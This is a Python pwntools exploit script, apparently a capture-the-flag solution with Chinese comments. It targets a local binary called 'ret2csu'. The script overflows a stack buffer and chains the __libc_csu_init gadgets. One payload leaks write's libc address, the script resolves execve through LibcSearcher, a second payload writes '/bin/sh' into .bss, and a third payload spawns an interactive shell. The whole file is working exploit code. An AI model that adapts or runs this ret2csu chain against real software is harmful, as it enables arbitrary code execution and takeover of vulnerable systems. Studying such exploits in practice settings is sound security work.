from pwn import *
from LibcSearcher import *
io = process('./ret2csu')
elf = ELF('./ret2csu')
got_write = elf.got['write']
gadget1 = 0x4005F0
gadget2 = 0x400606
bss_addr = elf.bss()
got_read = elf.got['read']
main_addr = elf.symbols['main']
def leak():#利用write函数打印出write的got表里储存的write函数在libc里的地址值
        payload1 = b'a'*0x88#溢出到返回值 
        payload1 += p64(gadget2)#前面的deadbeef是无用数据，用来抵消gadget2的mov rsp+0x8中的0x8,然后正式构造gadget的栈结构TIPS：此时为构造占结构，注意的是顺序为(rbx,rbp,r12,r13,r14,r15),因为gadget2最后让rsp加了0x38,而它又是根据rsp的偏移进行的赋值
        payload1 += b'deadbeef'
        payload1 += p64(0)#此处让rbx为0是为了之后gadget1中rbx+1与rbp比较时相等。（注意：不能改为其他值，因为后面call指令时，会用到rbx*8进行偏移进行call write函数，如果rbx不为0,就call不了write函数了）这时就不会jnz，而继续往下执行到ret指令(此时虽然会再次执行gadget2,但是地址已经成功泄漏，所以怎么改变也没关系)
        payload1 += p64(1)#此时令rbp为1也是为了后面的gadget1的比较
        payload1 += p64(got_write)#此时是为了后面的gadget1传参数，gadget1中call write函数打印write的libc地址
        payload1 += p64(1)#根据write的函数原型，第一个参数为标准输出‘1’
        payload1 += p64(got_write)#此时为write函数的第二个参数，打印地址
        payload1 += p64(8)#此时为write函数的第三个参数，打印的长度，此时只用打印后8位的地址就可以
        payload1 += p64(gadget1)#此时为gadget2的ret到gadget1处，利用gadget1中的call进行write的地址泄漏
        payload1 += b'a'*0x38#此时为栈平衡（因为前面让rsp加了0x38），为什么要在这里栈平衡：因为一会要进行call指令
        payload1 += p64(main_addr)#此时为重新执行主程序，为下次的溢出作准备
        io.send(payload1)
        sleep(1)
io.recvuntil('Hello, World\n')
leak()
write_libc =u64(io.recv(8))
libc = LibcSearcher('write', write_libc)	#查找libc版本
libc_base = write_libc - libc.dump('write') #计算该版本libc基地址
execve_addr = libc_base + libc.dump('execve') #查找该版本libc execve函数地址，亲测貌似system不行
def inject():#这里为payload2,是把execve函数地址和/bin/sh写入bss段，这里的个参数设计和上面的道理是一样的
        payload2 = b'a'*0x88
        payload2 += p64(gadget2)
        payload2 += b'deadbeef'
        payload2 += p64(0)
        payload2 += p64(1)
        payload2 += p64(got_read)
        payload2 += p64(0)
        payload2 += p64(bss_addr)
        payload2 += p64(16)#16是因为一个为execve的地址，一个是输入/bin/sh\x00
        payload2 += p64(gadget1)
        payload2 += b'a'*0x38
        payload2 += p64(main_addr)
        io.send(payload2)
        sleep(1)
io.recvuntil('Hello, World\n')
inject()
io.send(p64(execve_addr)+b'/bin/sh\x00')
print('Success')
def pwn():
        payload3 = b'a' * 0x88
        payload3 += p64(gadget2)
        payload3 += b'deadbeef'
        payload3 += p64(0)
        payload3 += p64(1)
        payload3 += p64(bss_addr)
        payload3 += p64(bss_addr+8)
        payload3 += p64(0)
        payload3 += p64(0)
        payload3 += p64(gadget1)
        payload3 += b'a' *0x38
        payload3 += p64(main_addr)
        io.send(payload3)
        sleep(1)
io.recvuntil('Hello, World\n')
print('Success')
pwn()
io.interactive()
